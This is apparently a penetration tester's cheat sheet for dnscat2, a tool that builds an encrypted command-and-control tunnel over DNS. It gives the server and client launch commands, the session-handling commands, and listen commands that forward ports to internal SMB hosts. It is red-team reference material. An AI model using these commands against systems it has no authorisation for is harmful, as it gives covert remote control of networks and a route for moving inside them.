> This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol, which is an effective tunnel out of almost every network.


#DNS_Tunneling #DNS #Tunneling

# Usage

Starting the `dnscat2` server
```bash
dnscat2-server hentai.corp
```

Run `dnscat2` client
```bash
./dnscat hentai.corp
```

## Interacting with the dnscat2 client from the dnscat2 server 

Show list of commands
```dnscat2
?
```

Show information on command E.g., listen
```dnscat2
listen --help
```

List all the active windows/sessions
```dnscat2
windows
```
```dnscat2
sessions
```

Interact with a command window/session
```dnscat2
window -i 1
```

Return to the main session
```dnscat2
suspend
```
```dnscat2
CTRL + Z
```

Kill a session
```dnscat2
kill 2
```

#Port_Forwarding 

Setting up a port forward from the loopback interface of current machine port 4455 to 172.16.169.11 port 445
```dnscat2
listen 127.0.0.1:4455 172.16.169.11:445
```

Setting up a port forward from the all interfaces of current machine port 4456 to 172.16.169.123 port 445
```dnscat2
listen 0.0.0.0:4456 172.16.169.123:445
```